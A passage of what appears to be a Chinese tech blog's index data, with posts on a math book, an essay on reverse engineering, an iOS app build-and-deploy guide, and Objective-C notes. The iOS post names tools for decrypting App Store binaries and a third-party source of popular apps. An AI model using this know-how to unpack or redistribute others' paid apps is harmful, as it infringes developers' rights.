度，说明它们是相关的，事件 B 与 C 之间的夹角也小于 90 度，说明它们也是相关的，但是事件 A 与 C 的夹角却大于 90 度，说明它们是负相关的。也就是说，相关性并不能简单地传递，如果我们只知道 A、B 相关且 B、C 相关，对 A、C 之间的相关性我们并不能下结论。 举一个例子，比如甲持有 S1、S2 两支股票，乙持有 S2、S3 两支股票，丙持有 S3、S4 两支股票。 显然，甲乙的收益情况有一定相关性，比如 S2 股票大涨两人都会赚钱，乙丙的收益情况也有一定相关性，比如 S3 股票大跌两人都会赔钱，但甲丙两人的收益则可以认为完全无关，因为两人所持的股票组合完全不重叠。 最后，关于相关性，作者态度非常谨慎。他指出，如果我们发现自然界或社会中两个事件之间不存在相关性，这并不表示两个事件之间毫无关系，可能只是我们现在的研究方法尚不能揭示出它们之间的关系。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:5:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["数学"],"content":"投票 一个群体经常需要对某些选择进行表决，一个朴素且大部分人都认同的原则是“少数服从多数”，即对备选项进行投票，得票多的方案胜出。 但是，“少数服从多数”的原则虽然看起来很简单，却也只在选项只有两项时才能取得最佳效果，只要选项多于两项，大多数人的喜好就可能自相矛盾。 比如有 A、B、C 三个选项，大家对这三个选项的态度是这样的： 人数占比 偏好排名 34% A \u003e B \u003e C 33% B \u003e C \u003e A 33% C \u003e B \u003e A 如果让大家进行投票，只能选一个选项，那么根据上表，会有 34% 的人选 A，33% 的人选 B，33% 的人选 C。选项 A 得到的支持最多，胜出。 但是仔细观察上表，我们可以看到除了第一行的 34% 的人，在另外 66% 的人心中 A 都是最差的选项，也就是说我们通过“少数服从多数”的原则，选出了对绝大多数人而言最差的那一项！ 再看上面的表格，假如选项 C 不存在： 人数占比 偏好排名 34% A \u003e B 33% B \u003e A 33% B \u003e A 显然，选项 B 将以绝对优势获胜。这时再将 C 加进去： 人数占比 偏好排名 34% A \u003e B \u003e C 33% B \u003e C \u003e A 33% C \u003e B \u003e A 结果按“少数服从多数”的原则，虽然 C 没有胜出，但原来的获胜者 B 也被淘汰了，胜利的桂冠落在了 A 的头上。也就是说，有些时候，加入一个精心设计的新选项，竟然会让原本有着绝对优势的方案落选。 为了解决这些的问题，先贤们设计了无数种更为精巧、复杂的投票方式，但遗憾的是每一种都有其不足，都会在某些情况下得到糟糕的结果。 究其原因，书中提到： 民意是根本不存在的东西，更准确地讲，只有在大多数人意见一致时民意才会存在。 个人的理解，如果用某种方法将群体的偏好映射成高维空间中的几何图形，那么大多数情况下这个图形应该是极为复杂的，而投票就是一种将这个图形“降维”投影到低维的方法。除非原始的高维图形本来就足够简单，否则只要投影的角度有所不同，得到的图形必然会大相径庭。 那么，是否存在完美的投票方案呢？是存在但还未被发现，还是从理论上就不存在？ 作者进行了很长篇幅的探讨，从欧几里得的第五公设，聊到罗素的集合论悖论，再聊到哥德尔的不完备定理，最后给出了他的结论： 只要选举制度遵循……那个表面看似不容置疑的公理（如果多数人对 A 的支持度超过对 B 的支持度，那么 B 就不可能成为赢家），就有可能掉进自我矛盾的陷阱。 也就是说，完美的投票方案也许从理论上就不存在。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:6:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["数学"],"content":"小结 除了确定性，数学也是人们用于思考不确定性的手段。借助数学知识，我们即使无法完全驯化不确定性，至少可以使它变得易于驾驭。 在白天时，尽可以相信自己的理念是正确的，但是到了晚上，则请认真思考自己的理念是不是错误的。 数学告诉我们：世界是有结构的；我们可以期待去了解它的部分结构，但不可能像我们想象的那样一蹴而就；在披上形式主义的外衣之后，我们的直觉将会变得更加强大。 数学是常识的衍生物，有的活动虽然没有被表示成一个方程式，或者被画成一幅图，却同样属于数学活动。 ","date":"2021-12-01","objectID":"/zh-cn/1-4/:7:0","tags":["数学"],"title":"读《魔鬼数学》","uri":"/zh-cn/1-4/"},{"categories":["逆向工程"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 谈谈我对逆向工程的一些理解和感悟。 引言 逆向工程，原名Reverse Engineering，简称RE。关于其书面介绍我就不复制粘贴百度百科了，简而言之就是从发布的产品中反向分析其程序逻辑和算法——基于各种目的。 准确地说，逆向工程包括软件逆向工程——即本文所讨论的，也包括硬件逆向工程。那么硬件逆向是怎么做的呢？据我所知，我国的芯片设计水平普遍比国外落后10年。当国外厂商已经成功流片量产X纳米的芯片时候，我们还在XX纳米的研发和难点攻关中挣扎。挣扎的过程之一就是芯片逆向。 一般从代理买到量产芯片后，第一步就是溶解外部封层，使用电子显微镜对电路进行拍摄，俗称拍片；第二步是使用特定工具软件（也是国外的）对照片进行切分，通过人力对自动生成的连线进行修复；第三步是将修复的连线还原成数字电路，再由IC逻辑工程师进行进一步修复；最后组合不同模块的门级电路，还原成硬件描述语言VHDL或者Verilog。之后就和正常的流程一样，开发、测试、模拟、仿真、流片…… ALU 扯远了，还是回到主题上来。硬件逆向的成本动辄成百上千万，没有纳税人的支持是玩不起的。但是软件逆向不同，只要一个智力正常的人，研究一两个月，也能上XX破解论坛上分享他们的破解成果了。 这也引出了一个问题，当我们在谈论逆向的时候，我们在谈论的是什么？ 软件逆向 二进制逆向就是IDA-Pro + F5一把梭吗？Java逆向就是JADX一把梭吗？很多接触过逆向的新手都知道不是，他们会跳出来反驳，夹杂着一些X86/ARM/MIPS Assembly、Smali、XYZ IR等等让人不明觉厉的词汇。虽然听不懂，但我们也知道他们想表达什么：逆向是一门牵涉甚广的领域。 的确，如果HTML、CSS这些领域是“单关节运动”，那么逆向就是“多关节运动”。前段时间有些使用node写前后端的开发者喜欢自称“全栈工程师”，要按照我的说法，逆向工程师才是当之无愧的全栈。为什么？来看看一个逆向工程师所应该具备的部分技能： 一定的软件开发能力，熟悉数据结构、算法 了解各种编程语言，熟悉编译原理 熟悉计算机基本原理、操作系统、编译器、链接器 熟悉对应平台或者虚拟机的汇编语言(机器码)、中间语言(字节码） … 一个好的逆向工程师，通常也是个不错的开发者。即便现在有各种收费或免费的反编译器，也需要逆向工程师对代码进行梳理、分析、审计。这就意味着逆向者需要站在比开发者更高的角度去审视，甚至比开发者更加理解他们的代码。…… 关于初衷 搞逆向这么麻烦，要懂这个，要懂那个，直接劝退了很大一波人。但其实这些只是“术”而已，实际工作中只需要用到一部分子集，甚至只要学会使用商业工具也能干活儿了。在我看来，逆向工程师的核心还是——强烈的好奇心。 或者说，这是大部分网络安全人员(黑客)所具备的特质。因为好奇某个商业软件的功能，或者好奇某个病毒蠕虫的行为，才走向了这条逆向之路。 逆向的过程是枯燥的。与其说逆向是技术活，在我看来更多是体力活。尤其是在分析大型软件的时候，每天改变量名，改函数名，分析树状的调用路径，……很容易让人感到厌烦。 但是对于抱有好奇心的人而言，逆向应该是快乐的。每分析出一个软件或者函数的行为，就仿佛侦探找到关键线索或证据一样兴奋。隐藏的路径越深，知道的人就越少，那么被藏起来的东西也就越有价值。 关于快乐 逆向应该是快乐的，但很多人不想让你快乐。于是有了各种符号加壳、混淆、加密、解释执行(虚拟机)等应用增强方案，来提高逆向工程的难度。这通常是企业中端安全工程师的杰作，或者是使用了安全公司的通用安全加固方案。 所谓的逆向混淆，只有在别人不知道你的方法时才有价值。对于通用的加固，所面临的挑战者甚多，其内部实现很可能已经被扒了个底朝天；而对于企业自研的方案，又通常因为太low而被简单绕过。所以，想让逆向工程师不快乐的人有时候成功了，但是大部分时候还是在逆向工程师手下败下阵来。用一朋友的话来说就是：“程序在我的设备、我的环境里运行，难道它还能上天？” 关于现状 应用程序是不能上天，但是逆向工程师也很难上天。记得柯南里有一句话让我印象深刻——“如果怪盗是富有创造力的艺术家，那么侦探充其量只是吹毛求疵的评论家”。逆向工程做的大部分都是破坏性的工作，而不像开发者那样带来正面价值。 目前社区中做逆向的大多是出于解谜(CTF)、软件破解、游戏外挂等，即便是专门讨论逆向的安全论坛中，对技术细节的探讨也寥寥无几，更多是炫耀和分享自己的“成果”。天下熙熙，皆为利来，天下攘攘，皆为利往，除了闷声发大财地以搞逆向赚钱的工作室外，公开分享的也就只能是为名了。 那么职业做逆向的情况又如何呢？专门做逆向的正经岗位应该是恶意软件分析了，衍生出的团队在商业环境中突出PR宣传安全产品或者情报能力。其他小公司里招聘做逆向的人，要么是分析竞争对手，要么围绕高流量软件的去进行分析、破解、换皮、刷粉养号等等，是在违法犯罪的边缘来回试探。 专门做逆向的情况不多，但是将其作为一门技能去掌握的人也不少。我自己本身也不是专门做逆向的，因为工作需要才去对其进行了解。除了开源软件，也有越来越多闭源软件的漏洞被暴露出来，你不去挖别人自然会去挖。就拿安卓每个月的安全通告来说，带星号的漏洞简直不要太多。 cve 图：Android Security Bulletin—March 2020 正面价值 逆向也有作为正面案例出现。比如对于一些开发者不再维护的软件，出现各种原因无法使用时，通常就有正义的逆向工程师去尝试解决困难，之前就有这么一个例子： help 还有比较经典的就是Linux系统中的著名的开源驱动nouveau部分功能就是通过逆向英伟达的驱动而开发的，因为英伟达出于各种保护的原因不愿意与开源社区合作而闹了诸多矛盾，这也是下面这张图片的根源。 Fuck Nvidia 总而言之，技术本身无对错好坏之分，关键是看使用的人以及使用的目的。 后记 回想起以前在研究高通可信执行环境时，被laginimaineb的那篇博客Exploring Qualcomm’s Secure Execution Environment给惊艳到了，大概那就是我心目中逆向大神该有的样子。那篇文章不是逆向某个特定的软件，也不是做了什么复杂的脱壳，而是将一种在未知环境中运行的未知格式程序就那么一字节一字节的分析出来。 qsee 要知道当时TEE尤其是高通的QSEE，在内部是被严密保护的，网上可以说几乎没有相关信息可以参考。甚至作为开发者都要以企业名义签署严格的NDA才能拿到开发工具。要在这种环境去逆向、调试、挖漏洞看似不可能，但laginimaineb接下了这个挑战，而且还超额完成了(userspace -\u003e QSEE Kernel)。他自己的说法是“For Fun”，我也相信他是“Fun”的。就是这样的人，让安全行业充满激情和热忱。 最后： Stay Curious, Stay Exploring \u0026\u0026 Happy Hacking! ","date":"2021-12-01","objectID":"/zh-cn/1-3/:0:0","tags":["逆向工程"],"title":"漫谈逆向工程","uri":"/zh-cn/1-3/"},{"categories":["IOS"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 上篇文章介绍了Objective-C的基本概念，本文就来接着看如何创建我们的第一个简单iOS应用， 本着简单可复现的方式，我们会以尽可能小的成本来构建并在真机运行iOS应用。 也就是说， 不用越狱， 也无需开发者账号。当然，一台iPhone手机还是需要的，最好还有一台Mac。 Xcode iOS的应用必须要用Xcode来创建，步骤很简单： 下载并打开Xcode 选择ios -\u003e Single View Application 填写项目名、开发组、包名（Identifier） 项目创建成功后，目录结构如下： $ tree HelloWorld/ HelloWorld/ ├── HelloWorld │ ├── AppDelegate.h │ ├── AppDelegate.m │ ├── Assets.xcassets │ │ ├── AppIcon.appiconset │ │ │ └── Contents.json │ │ └── Contents.json │ ├── Base.lproj │ │ ├── LaunchScreen.storyboard │ │ └── Main.storyboard │ ├── Info.plist │ ├── ViewController.h │ ├── ViewController.m │ └── main.m └── HelloWorld.xcodeproj ├── project.pbxproj ├── project.xcworkspace │ ├── contents.xcworkspacedata │ ├── xcshareddata │ │ └── IDEWorkspaceChecks.plist │ └── xcuserdata │ └── pan.xcuserdatad │ └── UserInterfaceState.xcuserstate └── xcuserdata └── pan.xcuserdatad ├── xcdebugger │ └── Breakpoints_v2.xcbkptlist └── xcschemes └── xcschememanagement.plist 可以看到项目下有两个文夹，分别是源代码文件HelloWorld，以及工程文件HelloWorld.xcodeproj。 作为示例，我们可以修改ViewController.m文件，如下： #import \"ViewController.h\" @interface ViewController () @end @implementation ViewController - (void)viewDidLoad { [super viewDidLoad]; // Do any additional setup after loading the view, typically from a nib. // 创建控件 UILabel* label = [[UILabel alloc]init]; label.text = @\"Hello World\"; // 自适应大小 [label sizeToFit]; // 居中 label.center = self.view.center; // 添加控件 [self.view addSubview :label]; } @end 这样，一个Hello World小程序就完成了，左上角运行按钮，即可编译并在模拟器中运行，如下： imgSim.jpg 在源代码框下方Products区域也能看到编译出的HelloWorld.app。 是不是很简单？好我们今天的文章就这样结束了，… 才怪！ 命令行编译 为了更好地了解编译过程，我们可以脱离Xcode IDE，在命令行编译该项目： 首先，在项目目录中查看Schemes： $ xcodebuild -list -project HelloWorld.xcodeproj Information about project \"HelloWorld\": Targets: HelloWorld Build Configurations: Debug Release If no build configuration is specified and -scheme is not passed then \"Release\" is used. Schemes: HelloWorld 然后，选择一个scheme进行编译，这里是HelloWorld： $ xcodebuild -scheme HelloWorld build note: Using new build system note: Planning build note: Using build description from disk Build system information error: Signing for \"HelloWorld\" requires a development team. Select a development team in the project editor. (in target 'HelloWorld') ** BUILD FAILED ** 凹，编译失败了，签名出错，因为万恶的资本主义坏苹果要求必须要每年99$或者299$去购买 Apple Developer Program 会员资格才能对应用进行合法签名，从而发布并运行我们创建的app。 但是这里写的这个简单APP只需要在我自己的手机上运行，所以并不需要这一步，禁用签名进行编译即可： $ xcodebuild -scheme HelloWorld build CODE_SIGN_IDENTITY=\"\" CODE_SIGNING_REQUIRED=NO Build settings from command line: CODE_SIGN_IDENTITY = CODE_SIGNING_REQUIRED = NO note: Using new build system note: Planning build note: Constructing build description Build system information warning: HelloWorld isn't code signed but requires entitlements. It is not possible to add entitlements to a binary without signing it. (in target 'HelloWorld') ... Validate /Users/pan/Library/Developer/Xcode/DerivedData/HelloWorld-dnyjqrgxcjjobvfzytzhtzpmjlmx/Build/Products/Debug-iphoneos/HelloWorld.app (in target: HelloWorld) ... Touch /Users/pan/Library/Developer/Xcode/DerivedData/HelloWorld-dnyjqrgxcjjobvfzytzhtzpmjlmx/Build/Products/Debug-iphoneos/HelloWorld.app (in target: HelloWorld) ... ** BUILD SUCCEEDED ** 编译成功了！中间省略了很多输出信息，这里就不贴了。值得一提的是，生成的app并不是在当前项目目录下， 而是在$HOME/Library/Developer/Xcode/DerivedData/$PROJECT-xxxx/{...}/HelloWorld.app中， xxxx看起来是一段随机数。HelloWorld.app就是一个传统的苹果应用，其目录结构如下： $ tree HelloWorld.app HelloWorld.app ├── Base.lproj │","date":"2021-12-01","objectID":"/zh-cn/1-2/:0:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["IOS"],"content":"模拟器 iOS模拟器除了可以在Xcode启动，也可以通过命令行进行管理，如： xcrun simctl help 查看具体帮助： $ xcrun simctl help install Install an app on a device. Usage: simctl install \u003cdevice\u003e \u003cpath\u003e 例如，我们要想在模拟器中启动上节编译好的HelloWorld.app，可以用以下命令： # 查看当前设备列表，选择一个设备UDID xcrun simctl list devices # 打开并启动设备 open -a Simulator --args -CurrentDeviceUDID $UDID # 在启动的设备中安装我们的应用，注意需要app支持x86架构 xcrun simctl install booted /path/to/HelloWorld.app 关于simctl的更多使用示例可以参考这篇文章。 签名与ipa 上节说到我们可以不签名来编译APP，但对于真机而言，要想运行应用，签名是必须的。 在Xcode7以后，开发者可以只用自己的Apple ID来在自己的设备上运行iOS应用，设置如下： imgSign.jpg 这样就可以通过USB在物理机上运行iOS应用了，不过要注意的是第一次启动时会提示不可信的开发者， 需要到设置-通用中进行信任。 ","date":"2021-12-01","objectID":"/zh-cn/1-2/:1:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["IOS"],"content":"什么是ipa iOS应用与Android应用类似的一点是，最后安装到系统中的都是一个zip压缩包，对于Android而言后缀是apk， 而对于iOS而言则是ipa（iPhone Application Archive）。通常ipa会通过苹果加密（使用FairPlay DRM技术）。 所以一般我们想从手机上已经安装的应用还原出ipa需要先解密，也通常称为砸壳。 常见的解密方法有如下几种： Clutch- Fast iOS executable dumper dumpdecrypted - Dumps decrypted mach-o files from encrypted iPhone applications from memory to disk frida-ios-dump 当然这些都是需要越狱的，在非越狱的机器上可以通过iMazing提取，热门应用可以直接在第三方应用商店下载， 比如AppCake。 ","date":"2021-12-01","objectID":"/zh-cn/1-2/:2:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["IOS"],"content":"ipa打包 对于有源码的应用，我们可以使用Xcode进行打包，打包流程可以参考stackoverflow中的一个回答。 不过这需要有开发者账号。由于我们是自己使用，因此要找一种无需开发者账号的方法。 无需开发者账号的打包方式有很多，比如： How to create ipa in xcode 6 without Apple Developer account? Export an IPA From Xcode Without an Apple Developer Account 这里使用命令行方式进行打包（archive\u0026export）： # archive xcodebuild archive -project HelloWorld/HelloWorld.xcodeproj -scheme HelloWorld -configuration Debug -archivePath ./build/HelloWorld # export xcodebuild -exportArchive -archivePath ./build/HelloWorld.xcarchive -exportOptionsPlist exportOptions.plist -exportPath ./build 这样就在./build目录下生成HelloWorld.ipa包了。其中exportOptions.plist如下： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\u003e \u003cplist version=\"1.0\"\u003e \u003cdict\u003e \u003ckey\u003emethod\u003c/key\u003e \u003cstring\u003edevelopment\u003c/string\u003e \u003c/dict\u003e \u003c/plist\u003e 详细exportOptions的key/value值可以通过xcodebuild -help查看。 ipa安装 无需AppStore的ipa的安装方法有下面几种（欢迎补充）： 使用Apple Configurator 2 工具（只支持MacOS） 使用Xcode安装 使用OTA部署方式安装 其他 ","date":"2021-12-01","objectID":"/zh-cn/1-2/:3:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["IOS"],"content":"使用Apple Configurator 2 Apple Configurator 2是苹果公司提供的一个部署和配置工具，可以直接从AppStore下载。 USB连接苹果手机后打开工具，图形界面操作，依次选择： Add -\u003e Apps -\u003e Choose from my Mac 然后点击生成的ipa文件即可。不是很推荐这个工具，如果一定要用图形界面，还不如用下面的Xcode。 ","date":"2021-12-01","objectID":"/zh-cn/1-2/:4:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["IOS"],"content":"使用Xcode 同样是图形界面操作，USB连接手机后依次选择： Window -\u003e Devices and Simulators -\u003e Devices 选择自己的手机后，点击+添加或者直接把ipa文件拖拽进来即可。 ","date":"2021-12-01","objectID":"/zh-cn/1-2/:5:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["IOS"],"content":"OTA部署 OTA部署支持使用HTTPS的方式部署和分发你的ipa包，一个示例OTA链接地址如下： itms-services://?action=download-manifest\u0026url=https://example.com/ota.plist itms-services是苹果上的自定义协议，会根据action下载并处理目标plist文件， ota.plist内容如下： \u003cplist version=\"1.0\"\u003e \u003cdict\u003e \u003ckey\u003eitems\u003c/key\u003e \u003carray\u003e \u003cdict\u003e \u003ckey\u003eassets\u003c/key\u003e \u003carray\u003e \u003cdict\u003e \u003ckey\u003ekind\u003c/key\u003e \u003cstring\u003esoftware-package\u003c/string\u003e \u003ckey\u003eurl\u003c/key\u003e \u003cstring\u003e https://example.com/app.ipa \u003c/string\u003e \u003c/dict\u003e \u003c/array\u003e \u003ckey\u003emetadata\u003c/key\u003e \u003cdict\u003e \u003ckey\u003ebundle-identifier\u003c/key\u003e \u003cstring\u003ecom.evilpan.helloworld\u003c/string\u003e \u003ckey\u003ebundle-version\u003c/key\u003e \u003cstring\u003e1\u003c/string\u003e \u003ckey\u003ekind\u003c/key\u003e \u003cstring\u003esoftware\u003c/string\u003e \u003ckey\u003etitle\u003c/key\u003e \u003cstring\u003e一个有趣的APP\u003c/string\u003e \u003c/dict\u003e \u003c/dict\u003e \u003c/array\u003e \u003c/dict\u003e \u003c/plist\u003e 解析后会从https://example.com/app.ipa下载应用，用户点击确定即可安装。 这里注意不论是ota.plist还是app.ipa的地址都是强制要求为HTTPS的， 因此若想以这种形式安装，还必须要去注册一个合法的SSL证书，也可以用免费的。 由于AppStore审核很严格，很多私人用的或者不合规的iOS软件都是通过OTA部署的形式分发的， 并且在会在安装说明中指引用户去设置-\u003e通用-\u003e描述文件与设备管理中手动点击信任该个人/企业开发者。 ","date":"2021-12-01","objectID":"/zh-cn/1-2/:6:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["IOS"],"content":"其他 除了上述方式，还有一些开源脚本可以帮助我们安装部署自己的应用，如ios-deploy， 只要连接USB输入以下命令即可安装： $ ios-deploy -b HelloWorld.ipa [....] Waiting for iOS device to be connected ------ Install phase ------ ... [ 65%] InstallingEmbeddedProfile [ 70%] VerifyingApplication [ 75%] CreatingContainer [ 80%] InstallingApplication [ 85%] PostflightingApplication [ 90%] SandboxingApplication [ 95%] GeneratingApplicationMap [100%] Installed package HelloWorld.ipa 有点类似于Android的adb install，相当方便。个人建议直接使用源码编译而不是npm安装。 后记 本文从开发者的角度，介绍了iOS应用创建、编译、打包、测试、部署等方面， 从零开始构建并运行我们的第一个iOS程序。 既介绍了模拟器的安装测试方式， 也介绍了物理机上的打包和部署过程。其中很多地方尽可能的使用命令行去运行， 这有利于后续自动化的操作，也有利于我们理解各个选项所使用到的参数作用。 为了降低工作量，我们特地在没有越狱以及没有开发者账号的情况下完成上述操作。 下一篇，我们将尝试从攻击者的角度，实际“破解”一个iOS应用，Stay Tuned！ 参考链接 iOS builds / ipa creation from the command line Setting up Frida Without Jailbreak on devices running iOS 12.1.4 AppCake - Third party ipa download dumpdecrypted - Dumps decrypted mach-o files from encrypted iPhone applications from memory to disk Clutch- Fast iOS executable dumper frida-ios-dump insert_dylib Non-market App Distribution - Monaca Docs ","date":"2021-12-01","objectID":"/zh-cn/1-2/:7:0","tags":["IOS"],"title":"iOS应用构建与部署小结","uri":"/zh-cn/1-2/"},{"categories":["Objective-C"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # Objective-C笔记 为什么突然要搞ObjectiveC？因为清明比较闲，两三天正好用来学习下iOS的逆向分析。 逆向的第一步当然是先从正向了解，否则给你源代码都看不懂，反编译出来的就更别提了。 因此本篇文章作为简单学习ObjC的记录，不会涉及太深入的语法特性，简而言之就是——够用就行。 什么是Objective-C Objective-C，简称OC，是一种通用、高级、面向对象的编程语言。它扩展了标准的ANSI C编程语言， 将Smalltalk式的消息传递机制加入到ANSI C中。当前主要支持的编译器有GCC和Clang（采用LLVM作为后端）。 Objective-C的商标权属于苹果公司，苹果公司也是这个编程语言的主要开发者。 苹果在开发NeXTSTEP操作系统时使用了Objective-C，之后被OS X和iOS继承下来。 现在Objective-C与Swift是OS X和iOS操作系统、及与其相关的API、Cocoa和Cocoa Touch的主要编程语言。 Objective-C是C语言的严格超集。这意味着任何C语言程序不经修改就可以直接通过Objective-C编译器， 在Objective-C中使用C语言代码也是完全合法的。Objective-C被描述为盖在C语言上的薄薄一层， 因为Objective-C的原意就是在C语言主体上加入面向对象的特性。OC项目中常用的拓展名如下： 扩展名 内容类型 .h 头文件。头文件包含类，类型，函数和常数的声明。 .m 源代码文件。这是典型的源代码文件扩展名，可以包含 Objective-C 和 C 代码。 .mm 源代码文件。带有这种扩展名的源代码文件，除了可以包含Objective-C和C代码以外还可以包含C++代码。仅在你的Objective-C代码中确实需要使用C++类或者特性的时候才用这种扩展名。 Hello, World! 学习任何一门语言之前，基本都需要做的就是编写并运行一个HelloWorld程序，对于OC而言则是如下： #import \u003cFoundation/Foundation.h\u003e int main (int argc, const char * argv[]) { @autoreleasepool { NSLog (@\"Hello, World!\"); } return 0; } 使用clang进行编译： clang -framework Foundation hello.m -o hello 运行： $ ./hello 2019-04-05 09:33:22.579 hello[75742:3312942] Hello, World! So easy！我们学习Objective-C时记住要重点关注概念而不是具体的语言细节，避免陷入学而无用的境地。 关键概念 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:0:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"消息传递 Objective-C最大的特色是承自Smalltalk的消息传递模型（message passing）， 此机制与今日C++式之主流风格差异甚大。 Objective-C里，与其说对象互相调用方法， 不如说对象之间互相传递消息更为精确。此二种风格的主要差异在于调用方法/消息传递这个动作。 C++里类别与方法的关系严格清楚，一个方法必定属于一个类别，而且在编译时（compile time） 就已经紧密绑定，不可能调用一个不存在类别里的方法。但在Objective-C，类别与消息的关系比较松散， 调用方法视为对对象发送消息，所有方法都被视为对消息的回应。所有消息处理直到运行时（runtime） 才会动态决定，并交由类别自行决定如何处理收到的消息。也就是说，一个类别不保证一定会回应收到的消息， 如果类别收到了一个无法处理的消息，程序只会抛出异常，不会出错或崩溃。 C++里，送一个消息给对象（或者说调用一个方法）的语法如下： obj.method(argument); Objective-C则写成： [obj method: argument]; 此二种风格各有优劣。C++强制要求所有的方法都必须有对应的动作，且编译期绑定使得函数调用非常快速。 缺点是仅能借由virtual关键字提供有限的动态绑定能力。Objective-C天生即具备鸭子类型之动态绑定能力， 因为运行期才处理消息，允许发送未知消息给对象。可以送消息给整个对象集合而不需要一一检查每个对象的类型， 也具备消息转送机制。同时空对象nil接受消息后默认为不做事，所以送消息给nil也不用担心程序崩溃。 举例来说，定义下面的程序： @interface MyClass: NSObject // instance method - (int) add: (int) num1 secondNumber:(int) num2; // static method + (int) mul: (int) num1 secondNumber:(int) num2; @end @implementation MyClass - (int) add: (int) num1 secondNumber:(int) num2 { return num1 + num2; } + (int) mul: (int) num1 secondNumber:(int) num2 { return num1 * num2; } @end 其中add方法是实例函数，mul是类函数，调用过程如下： int main() { int a = 3, b = 4; MyClass *myClass = [[MyClass alloc]init]; int c = [myClass add:a secondNumber:b]; int d = [MyClass mul:a secondNumber:b]; } 编译后在调试器中查看汇编可以看到，add方法的汇编是： 0x100000ea2: mov rsi, qword ptr [rbp - 0x18] 0x100000ea6: mov edx, dword ptr [rbp - 0x8] 0x100000ea9: mov ecx, dword ptr [rbp - 0xc] 0x100000eac: mov rdi, qword ptr [rip + 0x122d] ; \"add:secondNumber:\" 0x100000eb3: mov qword ptr [rbp - 0x28], rdi 0x100000eb7: mov rdi, rsi 0x100000eba: mov rsi, qword ptr [rbp - 0x28] 0x100000ebe: call qword ptr [rip + 0x13c] ; (void *)0x00007fff6344e000: objc_msgSend 其实就是转换为： objc_msgSend(myClass, \"add:secondNumber:\", 3, 4) 所有的Objective-C方法调用都通过objc_msgSend进行调用，且实例和方法名称分别为前两个参数。 这也是为什么OC方法调用称之为消息传递的原因。 ","date":"2021-12-01","objectID":"/zh-cn/1-1/:1:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"字符串 作为C语言的超集，Objective-C 支持 C 语言字符串方面的约定。也就是说，单个字符被单引号包括， 字符串被双引号包括。然而，大多数Objective-C通常不使用C语言风格的字符串。 反之，大多数框架把字符串传递给NSString对象。NSString类提供了字符串的类包装， 包含了所有你期望的优点，包括对保存任意长度字符串的内建内存管理机制，支持Unicode，printf风格的格式化工具， 等等。因为这种字符串使用的非常频繁，Objective-C提供了一个助记符@可以方便地从常量值创建NSString对象。 如下面的例子所示： // 从一个C语言字符串创建Objective-C字符串 NSString* fromCString = [NSString stringWithCString:\"A C string\" encoding:NSASCIIStringEncoding]; // 使用助记符@ NSString* name = @\"PANN\"; NSString* line = [NSString stringWithFormat:@\"Hello, %s\\n\", @\"String\"]; ","date":"2021-12-01","objectID":"/zh-cn/1-1/:2:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"类(class) 类是面向对象语言中最重要的一个概念，Objective-C同样支持类。下图是一个名为MyClass的类声明介绍： ","date":"2021-12-01","objectID":"/zh-cn/1-1/:3:0","tags":["Objective-C"],"title":"Objective-C笔记","uri":"/zh-cn/1-1/"},{"categories":["Objective-C"],"content":"声明 遵循C语言的规范，类声明一般定义在.h头文件中。类声明以关键字@interface作为开始，@end作为结束。 其中类方法前的+号表示类方法，-号表示实例方法。一个对应的C++类定义如下： public MyClass : NSObject { protected: int count; id data; NSString *name; public: id intWithString(NSString *aName); static MyClass *createMyClassWithString(NSString *aName); }; 